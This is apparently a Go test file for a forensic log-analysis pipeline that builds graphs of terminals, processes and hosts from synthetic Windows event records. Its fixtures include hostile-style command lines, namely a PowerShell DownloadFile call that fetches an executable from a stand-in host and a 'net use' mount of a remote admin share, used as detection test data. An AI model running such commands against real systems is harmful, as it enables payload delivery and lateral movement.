// in-package test: 分析者の割当が記録したホスト名で、Computer の値から作った端末を割当の端末へ
// まとめること、取り込みの起動で指定したずれと端末が画面の割当と同じグラフを組むこと、引数が
// 記録したホスト名を割当の端末へ結ぶことを確かめる。
package pipeline

import (
	"io"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/Intellectual-Chasen/Oraculum/backend/core"
)

// mergeTerminalId は割当が与える端末の外部識別子である。
const mergeTerminalId = "dc-1"

// dcSystemXML は dc.example.test が書いた、Security と別の file の 4688 を返す。
func dcSystemXML(at string) string {
	return "<Events>\n" +
		processCreationXML("DC.example.test", at, "901", "0x30", "0x1", `C:\Example\dc-task.exe`, "dc-task.exe") +
		"</Events>\n"
}

// hostnameAssignment は、periodSource 番目の収集元の観測期間を期間に持ち、端末の外部識別子と
// ホスト名の並びを記録した分析者の割当を返す。
func hostnameAssignment(
	t *testing.T, result ImportResult, periodSource int, clientIp, terminalId string, hostnames ...string,
) core.TerminalAssignment {
	t.Helper()
	assignment := sessionAssignment(t, result, periodSource, clientIp, terminalId, "", false)
	assignment.TerminalHostnames = hostnames
	if err := assignment.Validate(); err != nil {
		t.Fatalf("building the named assignment: %v", err)
	}
	return assignment
}

// terminalNodeIds はグラフの端末のノードの識別子を返す。
func terminalNodeIds(graph Graph) []string {
	var ids []string
	for _, node := range graph.nodes {
		if node.key.Kind == core.NodeKindTerminal {
			ids = append(ids, node.id)
		}
	}
	return ids
}

// 割当がホスト名を記録すると、同じ名前を Computer に書いた 2 つの file のレコードが、割当の
// 端末 1 つにまとまる。大文字と小文字は区別しない。期間の外のレコードはまとめない。
func TestAssignedHostnameMergesTheComputerTerminals(t *testing.T) {
	result := windowsEventSessionResult(t, sessionServerDocument,
		dcSystemXML("2001-02-03T04:20:00Z"), dcSystemXML("2001-02-03T05:20:00Z"))
	assignment := hostnameAssignment(t, result, 0, "192.0.2.20", mergeTerminalId, "dc", "dc.example.test")
	graph := NewGraph(result.WithAnalystTerminalAssignments(
		[]core.TerminalAssignment{assignment}), AllMatchConditions())

	merged, _ := core.TerminalNodeKey(mergeTerminalId)
	mergedAt := requireNodeAt(t, graph, merged)
	for _, path := range []string{`C:\Example\dc-service.exe`, `C:\Example\dc-task.exe`} {
		process := -1
		for at, node := range graph.nodes {
			if raw, _ := node.label.RawTextValue(); node.key.Kind == core.NodeKindProcess && raw == path &&
				hasEdge(graph, core.EdgeKindRanOn, at, mergedAt) {
				process = at
			}
		}
		if process < 0 {
			t.Errorf("the process %q does not run on the assigned terminal", path)
		}
	}
	for index := range 2 {
		key, _ := core.RecordingHostTerminalNodeKey(
			result.publications[index].status.Scope.SourceContentSha256, "dc.example.test")
		if _, present := graph.nodeAt[nodeIdOf(key)]; present {
			t.Errorf("the file %d keeps its own terminal of the Computer", index)
		}
	}
	// 3 つ目の file のレコードは割当の期間 (04:00:30 から 04:40:00) の外にある。
	outside, _ := core.RecordingHostTerminalNodeKey(
		result.publications[2].status.Scope.SourceContentSha256, "DC.example.test")
	requireNodeAt(t, graph, outside)
}

// 期間は秒の単位で比べる。期間の両端と同じ秒で、秒未満だけ前と後のレコードもまとめる。
func TestAssignedHostnameComparesThePeriodBySecond(t *testing.T) {
	result := windowsEventSessionResult(t, dcSystemXML("2001-02-03T04:00:30.500Z"),
		dcSystemXML("2001-02-03T04:00:30.100Z"), dcSystemXML("2001-02-03T04:00:30.900Z"))
	assignment := hostnameAssignment(t, result, 0, "192.0.2.20", mergeTerminalId, "dc.example.test")
	graph := NewGraph(result.WithAnalystTerminalAssignments(
		[]core.TerminalAssignment{assignment}), AllMatchConditions())
	if ids := terminalNodeIds(graph); len(ids) != 1 {
		t.Errorf("the graph holds the terminals %q, want the assigned terminal alone", ids)
	}
}

// 割当の無い名前の一致と、2 台の端末を指す割当では、Computer の端末をまとめない。
func TestComputerTerminalsStaySeparateWithoutOneAssignedTerminal(t *testing.T) {
	result := windowsEventSessionResult(t, sessionServerDocument, dcSystemXML("2001-02-03T04:20:00Z"))
	unassigned := NewGraph(result, AllMatchConditions())
	if ids := terminalNodeIds(unassigned); len(ids) != 2 {
		t.Errorf("the graph without assignments holds the terminals %q, want one per file", ids)
	}
	one := hostnameAssignment(t, result, 0, "192.0.2.20", mergeTerminalId, "dc.example.test")
	another := hostnameAssignment(t, result, 0, "192.0.2.21", "dc-2", "dc.example.test")
	ambiguous := NewGraph(result.WithAnalystTerminalAssignments(
		[]core.TerminalAssignment{one, another}), AllMatchConditions())
	for _, id := range []string{mergeTerminalId, "dc-2"} {
		key, _ := core.TerminalNodeKey(id)
		if at, present := ambiguous.nodeAt[nodeIdOf(key)]; present && ambiguous.nodes[at].observation == core.NodeObservationObserved {
			t.Errorf("the records are placed on the terminal %q of an ambiguous assignment", id)
		}
	}
}

// 割当で端末を与えた収集元と、Computer から端末を作る収集元が同じ端末であるとき、1 つの
// ノードにまとまり、その端末から自身への遠隔のセッションの候補を作らない。
func TestMergedTerminalHasNoRemoteSessionToItself(t *testing.T) {
	result := windowsEventSessionResult(t, sessionServerDocument)
	assignment := sessionAssignment(t, result, 0, "192.0.2.10", mergeTerminalId, "dc.example.test", false)
	graph := NewGraph(result.WithAnalystTerminalAssignments(
		[]core.TerminalAssignment{assignment}), AllMatchConditions())
	if edges := terminalSessionEdges(t, graph); len(edges) != 0 {
		t.Errorf("the merged terminal carries the remote session relations %+v, want none", edges)
	}
}

// memoryRunner は、名前から文書を開く取り込みの実行器を返す。
func memoryRunner(t *testing.T, documents map[string]string) *Runner {
	t.Helper()
	runner, err := NewRunner(Config{
		Open: func(originPath string) (io.ReadCloser, error) {
			return io.NopCloser(strings.NewReader(documents[originPath])), nil
		},
		Parsers: NewTestFormatRegistry(),
		Minter:  DigestMinter{}, Ordinals: NewInMemoryOrdinals(),
		Sanitize: func(value string) string { return value },
		Revision: "test-revision", SettingsDigest: "test-settings",
	})
	if err != nil {
		t.Fatal(err)
	}
	return runner
}

// graphShape は、ノードの識別子と、関係の種別・両端・状態・根拠の件数を文字列にして返す。
// 表示名と割当の由来は比べない。割当の IP の関係の根拠の件数も比べない。その根拠は分析者の
// 割当が挙げたレコードであり、取り込みの指定は根拠のレコードを持たない。
func graphShape(graph Graph) []string {
	var shape []string
	for _, node := range graph.nodes {
		shape = append(shape, "node "+node.id)
	}
	for _, edge := range graph.edges {
		evidence := strconv.Itoa(len(edge.evidence))
		if edge.kind == core.EdgeKindTerminalAddress {
			evidence = "-"
		}
		shape = append(shape, strings.Join([]string{"edge", string(edge.kind), graph.nodes[edge.source].id,
			graph.nodes[edge.target].id, string(edge.state), evidence}, " "))
	}
	slices.Sort(shape)
	return shape
}

// 地方時の収集元に、起動時の端末と時刻のずれを付けて取り込んだグラフは、端末を付けずに取り込み、
// 同じ端末の割当と同じずれの解釈を画面で記録したグラフと同じである。分析者が解釈を記録すると、
// 起動時のずれより所見のずれで読む。
func TestImportSpecifiedTerminalAndOffsetMatchTheAnalystInputs(t *testing.T) {
	documents := map[string]string{"ws.xml": sessionClientXML(false), "dc.xml": sessionServerXML(false)}
	offset := core.UtcOffset("+00:00")
	plans := func(terminals ...*SourceTerminal) []SourcePlan {
		return []SourcePlan{
			{OriginPath: "ws.xml", FileName: "ws.xml", FormatKey: WindowsEventXMLFormatKey, Terminal: terminals[0]},
			{OriginPath: "dc.xml", FileName: "dc.xml", FormatKey: WindowsEventXMLFormatKey, Terminal: terminals[1]},
		}
	}
	specified, err := memoryRunner(t, documents).Run(plans(
		&SourceTerminal{Ip: "192.0.2.10", TimeOffset: &offset},
		&SourceTerminal{TerminalHostname: "dc.example.test", TimeOffset: &offset}))
	if err != nil {
		t.Fatalf("importing with the terminals and the offsets: %v", err)
	}
	specifiedGraph := NewGraph(analystInputs{}.applyTo(specified), AllMatchConditions())
	if len(terminalSessionEdges(t, specifiedGraph)) != 1 {
		t.Fatal("the import specification gives no remote session relation")
	}

	plain, err := memoryRunner(t, documents).Run(plans(nil, nil))
	if err != nil {
		t.Fatal(err)
	}
	var assignments []core.TerminalAssignment
	interpretations := map[string]core.TimestampInterpretation{}
	for index, imported := range specified.ImportSpecifiedTerminalAssignments() {
		imported.Origin = core.TerminalAssignmentOriginAnalystSupplied
		imported.Derivation, imported.Author = "起動時の指定と同じ端末", "analyst"
		imported.BasisRecordRefs = []core.AssertionRecordRef{
			core.NewAssertionRecordRef(plain.publications[index].records[0].Locator),
		}
		assignments = append(assignments, imported)
		interpretations[imported.SourceContentSha256] = core.TimestampInterpretation{
			Offset: offset, AssertionId: "as:" + imported.SourceId,
		}
	}
	analystGraph := NewGraph(analystInputs{
		assignments: assignments, interpretations: sourceTimeInterpretations{applied: interpretations},
	}.applyTo(plain), AllMatchConditions())
	if got, want := graphShape(specifiedGraph), graphShape(analystGraph); !slices.Equal(got, want) {
		t.Errorf("the graphs differ:\nimport  %q\nanalyst %q", got, want)
	}

	// -00:20 の所見で読むと、端末の期間は 04:20 から 04:50、ログオンは 04:30 と 04:31 になる。
	revised := analystInputs{interpretations: sourceTimeInterpretations{applied: map[string]core.TimestampInterpretation{
		assignments[0].SourceContentSha256: {Offset: "-00:20", AssertionId: "as:revised"},
	}}}.applyTo(specified)
	if at := revised.publications[0].records[0].ObservedAt; at.Interpretation == nil ||
		at.Interpretation.Offset != "-00:20" {
		t.Errorf("the record time carries %+v, want the offset of the assertion", at.Interpretation)
	}
}

// 取り込みの指定の割当だけから作ったエッジの期間は、起動で指定したずれで読んだ地方時の時刻であり、
// 所見を持たない解釈を持つ。応答の期間から、時刻を読んだずれとその出どころを読める。
func TestAssignmentEdgeRangeCarriesTheOffsetSpecifiedAtImport(t *testing.T) {
	offset := core.UtcOffset("+00:00")
	result, err := memoryRunner(t, map[string]string{"ws.xml": sessionClientXML(false)}).Run([]SourcePlan{{
		OriginPath: "ws.xml", FileName: "ws.xml", FormatKey: WindowsEventXMLFormatKey,
		Terminal: &SourceTerminal{Ip: "192.0.2.10", TimeOffset: &offset},
	}})
	if err != nil {
		t.Fatalf("importing with the terminal and the offset: %v", err)
	}
	graph := NewGraph(analystInputs{}.applyTo(result), AllMatchConditions())
	checked := 0
	for _, edge := range graph.edges {
		if len(edge.evidence) != 0 || len(edge.terminalAssignmentList()) == 0 {
			continue
		}
		checked++
		applicable := graph.responseEdge(edge, nil).ApplicableRange
		want := core.TimestampInterpretation{Offset: offset}
		if applicable == nil || applicable.From.Interpretation == nil || applicable.To.Interpretation == nil ||
			*applicable.From.Interpretation != want || *applicable.To.Interpretation != want {
			t.Errorf("the %s edge has the range %+v, want both ends read with the import offset", edge.kind, applicable)
			continue
		}
		if err := applicable.Validate(); err != nil {
			t.Errorf("the range of the %s edge is invalid: %v", edge.kind, err)
		}
	}
	if checked == 0 {
		t.Fatal("the graph holds no edge made from the import assignment alone")
	}
}

// importAssignedLocalResult は、地方時の収集元 ws.xml (観測期間は地方時 04:00:00 から 04:30:00) に、
// 起動の指定で IP の割当とずれ offset を付けて取り込む。
func importAssignedLocalResult(t *testing.T, offset core.UtcOffset) ImportResult {
	t.Helper()
	result, err := memoryRunner(t, map[string]string{"ws.xml": sessionClientXML(false)}).Run([]SourcePlan{{
		OriginPath: "ws.xml", FileName: "ws.xml", FormatKey: WindowsEventXMLFormatKey,
		Terminal: &SourceTerminal{Ip: "192.0.2.10", TimeOffset: &offset},
	}})
	if err != nil {
		t.Fatalf("importing with the terminal and the offset: %v", err)
	}
	return result
}

// assignmentOnlyEdges は、根拠のレコードを持たず割当だけから作ったエッジを返す。
func assignmentOnlyEdges(t *testing.T, graph Graph) []graphEdge {
	t.Helper()
	var edges []graphEdge
	for _, edge := range graph.edges {
		if len(edge.evidence) == 0 && len(edge.terminalAssignmentList()) > 0 {
			edges = append(edges, edge)
		}
	}
	if len(edges) == 0 {
		t.Fatal("the graph holds no edge made from the import assignment alone")
	}
	return edges
}

// 地方時の期間を持つ割当から作ったエッジは、期間を収集元の時刻の解釈で読んで期間の絞り込みを
// 判定する。地方時 04:00:00 から 04:30:00 を +09:00 で読むと、UTC で前日の 19:00:00 から
// 19:30:00 である。両端の時点を指す絞り込みを通り、両端の 1 秒外を指す絞り込みを通らない。
func TestAssignmentEdgeWithALocalRangeIsFilteredByTheInterpretedPeriod(t *testing.T) {
	result := importAssignedLocalResult(t, "+09:00")
	graph := NewGraph(analystInputs{}.applyTo(result), AllMatchConditions())
	from := time.Date(2001, 2, 2, 19, 0, 0, 0, time.UTC)
	to := time.Date(2001, 2, 2, 19, 30, 0, 0, time.UTC)
	for _, edge := range assignmentOnlyEdges(t, graph) {
		for _, testCase := range []struct {
			at   time.Time
			want bool
		}{
			{from, true}, {to, true},
			{from.Add(-time.Second), false}, {to.Add(time.Second), false},
		} {
			filter := RecordFilter{TimeFrom: &testCase.at, TimeTo: &testCase.at, TimeUnit: time.Second}
			if got := graph.assignmentsMatch(edge, filter); got != testCase.want {
				t.Errorf("the %s edge passes the period at %s: %v, want %v", edge.kind, testCase.at, got, testCase.want)
			}
		}
	}
}

// 分析者が収集元に解釈を記録すると、割当だけから作ったエッジの期間は、起動で指定したずれに
// 替わって所見の解釈 (所見の識別子を持つ) で読んだ時刻になる。
func TestAssignmentEdgeRangeTakesTheAnalystInterpretation(t *testing.T) {
	result := importAssignedLocalResult(t, "+09:00")
	content := result.ImportSpecifiedTerminalAssignments()[0].SourceContentSha256
	analyst := core.TimestampInterpretation{Offset: "+00:00", AssertionId: "as:analyst"}
	graph := NewGraph(analystInputs{interpretations: sourceTimeInterpretations{
		applied: map[string]core.TimestampInterpretation{content: analyst},
	}}.applyTo(result), AllMatchConditions())
	for _, edge := range assignmentOnlyEdges(t, graph) {
		applicable := graph.responseEdge(edge, nil).ApplicableRange
		if applicable == nil || applicable.From.Interpretation == nil || applicable.To.Interpretation == nil ||
			*applicable.From.Interpretation != analyst || *applicable.To.Interpretation != analyst {
			t.Errorf("the %s edge has the range %+v, want both ends read with the analyst interpretation",
				edge.kind, applicable)
		}
	}
}

// 地方時の 2 つの収集元のうち、一方に起動時の端末 (ホスト名を持つ) とずれを、他方にずれだけを
// 付けると、他方の Computer の端末が起動時の端末にまとまり、その端末から自身への遠隔のセッションの
// 候補を作らない。
func TestImportSpecifiedHostnameMergesTheComputerTerminalOfAnotherLocalSource(t *testing.T) {
	assigned := "<Events>\n" +
		processCreationXML("dc", sessionTime("04:00:00", false), "601", "0x40", "0x1", `C:\Example\ad-a.exe`, "ad-a.exe") +
		processCreationXML("dc", sessionTime("04:45:00", false), "602", "0x41", "0x1", `C:\Example\ad-b.exe`, "ad-b.exe") +
		"</Events>\n"
	documents := map[string]string{"ad.xml": assigned, "dc.xml": sessionServerXML(false)}
	offset := core.UtcOffset("+00:00")
	result, err := memoryRunner(t, documents).Run([]SourcePlan{
		{OriginPath: "ad.xml", FileName: "ad.xml", FormatKey: WindowsEventXMLFormatKey, Terminal: &SourceTerminal{
			TerminalId: "ad", TerminalHostname: "DC.example.test", Ip: "192.0.2.10", TimeOffset: &offset,
		}},
		{OriginPath: "dc.xml", FileName: "dc.xml", FormatKey: WindowsEventXMLFormatKey,
			Terminal: &SourceTerminal{TimeOffset: &offset}},
	})
	if err != nil {
		t.Fatalf("importing with the terminal and the offsets: %v", err)
	}
	if got := len(result.ImportSpecifiedTerminalAssignments()); got != 1 {
		t.Fatalf("the import specifies %d terminal assignments, want the one with the terminal items", got)
	}
	graph := NewGraph(analystInputs{}.applyTo(result), AllMatchConditions())
	if ids := terminalNodeIds(graph); len(ids) != 1 {
		t.Errorf("the graph holds the terminals %q, want the one terminal of the import specification", ids)
	}
	if edges := terminalSessionEdges(t, graph); len(edges) != 0 {
		t.Errorf("the merged terminal carries the remote session relations %+v, want none", edges)
	}
}

// 引数が名指したホスト名は、割当がそのホスト名を記録した端末へ候補で結ばれる。関係は割当を
// 運び、根拠は引数のレコードである。短い名前で名指しても、割当の短い名前と一致する。
func TestArgumentNamedHostLinksTheAssignedTerminal(t *testing.T) {
	document := "<Events>\n" +
		securityEventXML("101", "4688", logonHostA, "2001-02-03T04:05:10.000Z",
			"NewProcessId", "0x4d2", "NewProcessName", `C:\Windows\System32\net.exe`,
			"CommandLine", `net use \\HOST-B\c$`, "ProcessId", "0x10") +
		"</Events>\n"
	server := "<Events>\n" +
		securityEventXML("201", "4624", logonHostB, "2001-02-03T04:00:00.000Z", "TargetLogonId", "0x1") +
		securityEventXML("202", "4624", logonHostB, "2001-02-03T04:10:00.000Z", "TargetLogonId", "0x2") +
		"</Events>\n"
	result := windowsEventSessionResult(t, document, server)
	assignment := hostnameAssignment(t, result, 1, "192.0.2.30", "b-1", "host-b", logonHostB)
	graph := NewGraph(result.WithAnalystTerminalAssignments(
		[]core.TerminalAssignment{assignment}), AllMatchConditions())

	terminal, _ := core.TerminalNodeKey("b-1")
	terminalAt := requireNodeAt(t, graph, terminal)
	record := recordOfEvent(t, graph, "101")
	var linked []graphEdge
	for _, edge := range graph.edges {
		if edge.kind == core.EdgeKindArgumentNamesObject && edge.target == terminalAt {
			linked = append(linked, edge)
		}
	}
	if len(linked) != 1 {
		t.Fatalf("the argument links the assigned terminal by %d relations, want 1", len(linked))
	}
	edge := linked[0]
	if edge.state != core.RelationStateCandidate || !slices.Equal(edge.evidence, []int{record}) ||
		len(edge.terminalAssignmentList()) != 1 || edge.terminalAssignmentList()[0].TerminalId != "b-1" {
		t.Errorf("the relation is %s with evidence %v and assignments %+v, want a candidate of the 4688 and the assignment",
			edge.state, edge.evidence, edge.terminalAssignmentList())
	}
	if host := nodeOf(graph, core.NodeKindDomain, "HOST-B"); host < 0 {
		t.Error("the argument no longer names the hostname node")
	}
}

// 割当の期間の外の引数と、割当と別の案件の引数は、割当の端末へ結ばない。別の案件の Computer の
// 端末も、割当の端末にまとめない。
func TestAssignedHostnameStaysInsideItsCaseAndPeriod(t *testing.T) {
	argument := func(at string) string {
		return "<Events>\n" + securityEventXML("101", "4688", logonHostA, at,
			"NewProcessId", "0x4d2", "NewProcessName", `C:\Windows\System32\net.exe`,
			"CommandLine", `net use \\host-b\c$`, "ProcessId", "0x10") + "</Events>\n"
	}
	server := "<Events>\n" +
		securityEventXML("201", "4624", logonHostB, "2001-02-03T04:00:00.000Z", "TargetLogonId", "0x1") +
		securityEventXML("202", "4624", logonHostB, "2001-02-03T04:10:00.000Z", "TargetLogonId", "0x2") +
		"</Events>\n"
	otherServer := "<Events>\n" +
		securityEventXML("301", "4624", logonHostB, "2001-02-03T04:05:00.000Z", "TargetLogonId", "0x3") +
		"</Events>\n"
	for name, check := range map[string]struct {
		at, argumentCase string
	}{
		"outside the period": {"2001-02-03T04:15:00.000Z", "c1"},
		"another case":       {"2001-02-03T04:05:10.000Z", "c2"},
	} {
		t.Run(name, func(t *testing.T) {
			result := sessionSourcesResult(t,
				sessionSource{name: "argument.xml", document: argument(check.at), caseId: check.argumentCase,
					format: WindowsEventXMLFormatKey},
				sessionSource{name: "server.xml", document: server, caseId: "c1", format: WindowsEventXMLFormatKey},
				sessionSource{name: "other.xml", document: otherServer, caseId: "c2", format: WindowsEventXMLFormatKey})
			assignment := hostnameAssignment(t, result, 1, "192.0.2.30", "b-1", "host-b", logonHostB)
			graph := NewGraph(result.WithAnalystTerminalAssignments(
				[]core.TerminalAssignment{assignment}), AllMatchConditions())

			terminal, _ := core.TerminalNodeKey("b-1")
			terminalAt := requireNodeAt(t, graph, terminal)
			for _, edge := range graph.edges {
				if edge.kind == core.EdgeKindArgumentNamesObject && edge.target == terminalAt {
					t.Errorf("the argument links the assigned terminal with the evidence %v", edge.evidence)
				}
			}
			other, _ := core.RecordingHostTerminalNodeKey(
				result.publications[2].status.Scope.SourceContentSha256, logonHostB)
			requireNodeAt(t, graph, other)
		})
	}
}

// 引数の URL のホストは、Proxy の記録の要求先と同じホスト名のノードになる。
func TestArgumentUrlHostIsTheRequestedHostnameNode(t *testing.T) {
	line := func(number int64) *int64 { return &number }
	graph := graphOfRecords(t, []RecordEntry{
		{
			Locator: core.RecordLocator{SourceFileName: "synthetic.log", PositionKind: core.PositionKindLineNumber, LineNumber: line(1)},
			Semantics: &RecordSemantics{
				ObservationKind: core.ObservationKind{Raw: []core.RecordField{}},
				Fields: []core.RecordField{
					syntheticField(t, "tmid", core.SemanticKeyTerminalId, "T1"),
					syntheticField(t, "cmd", core.SemanticKeyProcessCommandLine,
						`powershell -c "(New-Object Net.WebClient).DownloadFile('http://web.example.test/a.exe','C:\Example\a.exe')"`),
				},
			},
		},
		{
			Locator: core.RecordLocator{SourceFileName: "synthetic.log", PositionKind: core.PositionKindLineNumber, LineNumber: line(2)},
			Semantics: &RecordSemantics{
				ObservationKind: core.ObservationKind{Raw: []core.RecordField{}},
				Fields: []core.RecordField{
					syntheticField(t, "src", core.SemanticKeyConnectionSourceAddress, "192.0.2.40"),
					syntheticField(t, "host", core.SemanticKeyConnectionDestinationHostname, "web.example.test"),
				},
			},
		},
	})
	var hosts []int
	for at, node := range graph.nodes {
		if node.key.Kind == core.NodeKindDomain && node.key.Values[0].Value == "web.example.test" {
			hosts = append(hosts, at)
		}
	}
	if len(hosts) != 1 {
		t.Fatalf("the graph holds %d hostname nodes for the host, want 1", len(hosts))
	}
	argument, requested := false, false
	for _, edge := range graph.edges {
		if edge.target != hosts[0] {
			continue
		}
		argument = argument || edge.kind == core.EdgeKindArgumentNamesObject
		requested = requested || edge.kind != core.EdgeKindArgumentNamesObject
	}
	if !argument || !requested {
		t.Errorf("the hostname node is named by the argument %v and by the request %v, want both", argument, requested)
	}
}
